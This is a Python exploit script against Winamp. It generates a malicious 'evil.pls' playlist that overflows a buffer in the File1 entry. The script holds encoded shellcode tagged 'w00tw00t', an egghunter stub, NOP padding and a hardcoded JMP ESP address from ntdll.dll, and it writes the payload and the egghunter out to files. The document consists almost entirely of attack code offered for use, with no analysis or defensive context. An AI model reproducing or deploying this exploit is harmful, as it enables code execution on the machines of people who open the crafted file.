#!/usr/bin/python -w
# winamp exploit

from struct import pack

filename="evil.pls"

# bad chars = 0a; 0c; 0d;  0f
buf =  b"w00tw00t"
buf += b"\x89\xe3\xd9\xc7\xd9\x73\xf4\x5e\x56\x59\x49\x49\x49"
buf += b"\x49\x49\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43"
buf += b"\x37\x51\x5a\x6a\x41\x58\x50\x30\x41\x30\x41\x6b\x41"
buf += b"\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42"
buf += b"\x58\x50\x38\x41\x42\x75\x4a\x49\x6b\x4c\x5a\x48\x6e"
buf += b"\x62\x33\x30\x63\x30\x73\x30\x43\x50\x6b\x39\x69\x75"
buf += b"\x50\x31\x79\x50\x35\x34\x6e\x6b\x62\x70\x34\x70\x4c"
buf += b"\x4b\x46\x32\x44\x4c\x4c\x4b\x43\x62\x37\x64\x6e\x6b"
buf += b"\x42\x52\x34\x68\x64\x4f\x6c\x77\x62\x6a\x46\x46\x50"
buf += b"\x31\x69\x6f\x6c\x6c\x77\x4c\x31\x71\x43\x4c\x56\x62"
buf += b"\x36\x4c\x45\x70\x79\x51\x48\x4f\x76\x6d\x63\x31\x5a"
buf += b"\x67\x48\x62\x69\x62\x73\x62\x76\x37\x6e\x6b\x31\x42"
buf += b"\x62\x30\x4c\x4b\x33\x7a\x47\x4c\x6e\x6b\x62\x6c\x46"
buf += b"\x71\x72\x58\x7a\x43\x52\x68\x76\x61\x4e\x31\x56\x31"
buf += b"\x4c\x4b\x56\x39\x37\x50\x56\x61\x4e\x33\x4e\x6b\x32"
buf += b"\x69\x44\x58\x69\x73\x67\x4a\x52\x69\x6e\x6b\x46\x54"
buf += b"\x4c\x4b\x35\x51\x39\x46\x50\x31\x79\x6f\x4e\x4c\x79"
buf += b"\x51\x58\x4f\x36\x6d\x57\x71\x58\x47\x76\x58\x69\x70"
buf += b"\x33\x45\x78\x76\x73\x33\x63\x4d\x6a\x58\x75\x6b\x53"
buf += b"\x4d\x44\x64\x64\x35\x7a\x44\x56\x38\x4c\x4b\x51\x48"
buf += b"\x47\x54\x36\x61\x6b\x63\x71\x76\x6c\x4b\x64\x4c\x72"
buf += b"\x6b\x6c\x4b\x36\x38\x77\x6c\x33\x31\x4a\x73\x6c\x4b"
buf += b"\x75\x54\x6e\x6b\x37\x71\x7a\x70\x6d\x59\x53\x74\x67"
buf += b"\x54\x74\x64\x71\x4b\x31\x4b\x53\x51\x56\x39\x42\x7a"
buf += b"\x72\x71\x69\x6f\x6b\x50\x43\x6f\x63\x6f\x43\x6a\x4c"
buf += b"\x4b\x42\x32\x4a\x4b\x4c\x4d\x31\x4d\x70\x68\x66\x53"
buf += b"\x46\x52\x63\x30\x77\x70\x72\x48\x74\x37\x73\x43\x65"
buf += b"\x62\x33\x6f\x33\x64\x55\x38\x70\x4c\x44\x37\x34\x66"
buf += b"\x67\x77\x4b\x4f\x79\x45\x4f\x48\x4c\x50\x56\x61\x37"
buf += b"\x70\x77\x70\x36\x49\x5a\x64\x43\x64\x76\x30\x35\x38"
buf += b"\x44\x69\x6f\x70\x72\x4b\x35\x50\x6b\x4f\x39\x45\x36"
buf += b"\x30\x36\x30\x76\x30\x76\x30\x47\x30\x72\x70\x51\x50"
buf += b"\x76\x30\x32\x48\x38\x6a\x76\x6f\x59\x4f\x69\x70\x39"
buf += b"\x6f\x59\x45\x5a\x37\x42\x4a\x33\x35\x52\x48\x6b\x70"
buf += b"\x6e\x48\x43\x54\x57\x54\x45\x38\x74\x42\x63\x30\x66"
buf += b"\x71\x63\x6c\x4b\x39\x69\x76\x61\x7a\x44\x50\x42\x76"
buf += b"\x50\x57\x71\x78\x6c\x59\x4d\x75\x42\x54\x53\x51\x6b"
buf += b"\x4f\x4e\x35\x6d\x55\x4b\x70\x42\x54\x44\x4c\x4b\x4f"
buf += b"\x70\x4e\x73\x38\x52\x55\x6a\x4c\x50\x68\x5a\x50\x4d"
buf += b"\x65\x6e\x42\x56\x36\x59\x6f\x4b\x65\x72\x48\x71\x73"
buf += b"\x52\x4d\x53\x54\x73\x30\x6d\x59\x38\x63\x43\x67\x30"
buf += b"\x57\x43\x67\x70\x31\x4b\x46\x31\x7a\x64\x52\x51\x49"
buf += b"\x66\x36\x79\x72\x59\x6d\x61\x76\x69\x57\x77\x34\x31"
buf += b"\x34\x35\x6c\x77\x71\x36\x61\x4e\x6d\x33\x74\x76\x44"
buf += b"\x52\x30\x48\x46\x65\x50\x67\x34\x53\x64\x42\x70\x30"
buf += b"\x56\x36\x36\x76\x36\x43\x76\x76\x36\x30\x4e\x42\x76"
buf += b"\x30\x56\x70\x53\x72\x76\x52\x48\x30\x79\x5a\x6c\x45"
buf += b"\x6f\x6c\x46\x59\x6f\x69\x45\x6e\x69\x69\x70\x52\x6e"
buf += b"\x31\x46\x37\x36\x4b\x4f\x74\x70\x31\x78\x63\x38\x4f"
buf += b"\x77\x75\x4d\x31\x70\x79\x6f\x49\x45\x6f\x4b\x4a\x50"
buf += b"\x6e\x55\x49\x32\x31\x46\x72\x48\x4c\x66\x6f\x65\x6f"
buf += b"\x4d\x6d\x4d\x69\x6f\x4e\x35\x37\x4c\x66\x66\x71\x6c"
buf += b"\x76\x6a\x6b\x30\x79\x6b\x6d\x30\x51\x65\x34\x45\x6f"
buf += b"\x4b\x72\x67\x55\x43\x44\x32\x42\x4f\x33\x5a\x43\x30"
buf += b"\x71\x43\x4b\x4f\x58\x55\x41\x41"



file2 = open("shellcode.bin", "w")
file2.write(buf)
file2.close()

start = "[playlist]\r\rFile1=\\\\"
#nop = "\x90"*856
nop = "\x90"*100 + buf + "\x90"*(756-len(buf))

buf =  b"\x90\x90\x90\x90"
buf += b"\x50\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49"
buf += b"\x49\x49\x49\x49\x49\x37\x51\x5a\x6a\x41\x58\x50\x30"
buf += b"\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32\x42\x42"
buf += b"\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49"
buf += b"\x51\x76\x6e\x61\x6a\x6a\x6b\x4f\x54\x4f\x50\x42\x63"
buf += b"\x62\x30\x6a\x63\x32\x32\x78\x5a\x6d\x76\x4e\x75\x6c"
buf += b"\x74\x45\x61\x4a\x73\x44\x58\x6f\x58\x38\x50\x77\x66"
buf += b"\x50\x50\x30\x44\x34\x4e\x69\x78\x57\x6e\x4f\x53\x45"
buf += b"\x7a\x4a\x4e\x4f\x43\x45\x4d\x37\x6b\x4f\x49\x77\x41"
buf += b"\x41"




ef = open('egghunter.bin', 'w')
ef.write(buf)
ef.close()

shellcode = "\xcc"*2 + buf  + "\xcc"*(164-len(buf))  
print("Payload length is ", len(buf))
print("shellcode length is ", len(shellcode))
print("nop length is ", len(nop))
# shellcode difference of 0xa8 less

# Found commands, item 0
# Address=77840F1A
# Disassembly=JMP ESP
# Module Name=C:\Windows\system32\ntdll.dll
jmp_esp = pack('i', 0x77840f1a)
jmp = jmp_esp + "\xE9\x53\xFF\xFF\xFF" + "\x90"*(12-5)
end= "\r\nTitle1=pwnd\r\nLength1=5`1\r\nNumberOfEntries=1\r\nVersions=2\r\n";

buffer = start + nop + shellcode + jmp + end

textfile = open(filename , 'w')
textfile.write(buffer)
textfile.close()
